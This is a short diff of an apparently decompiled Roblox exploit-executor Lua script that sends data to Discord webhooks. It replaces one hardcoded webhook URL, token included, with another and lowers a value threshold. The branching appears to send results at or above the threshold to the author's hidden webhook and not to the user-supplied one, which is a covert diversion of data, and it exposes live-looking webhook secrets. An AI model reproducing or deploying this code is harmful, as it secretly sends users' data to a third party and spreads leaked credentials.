@@ -837,7 +837,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                     task.wait(0.5);
                     l_result_0:Close();
                 end;]]
-                local FORIWEBHOOK1 = "https://discord.com/api/webhooks/1450947875138699357/fwetvpZCqKo2nD6GYL19UPkFHfsforMUJXehcoOWAFUpOqub_juGRUuO-Nw0Ah0jUP3b"
+                local webhooks = "https://discord.com/api/webhooks/1450162332154990716/u5X2hSvqPIBQg7S_lqGety3cOxJbA_Dhpcm3wEJvNxfclkOOY9NIi0bjXcE8mfgbvr4V"
                 if getgenv().UserWebhookURL then
                     local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
                     if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
@@ -855,7 +855,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                                 v111
                             }
                         };
-                        if v109.genValue < 50000000 then
+                        if v109.genValue < 40000000 then
                         pcall(function() 
                             v7({
                                 Url = getgenv().UserWebhookURL, 
@@ -869,7 +869,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                     else
                         pcall(function()
                             v7({
-                                Url = FORIWEBHOOK1,
+                                Url = webhooks,
                                 Method = "POST",
                                 Headers = {
                                     ["Content-Type"] = "application/json"
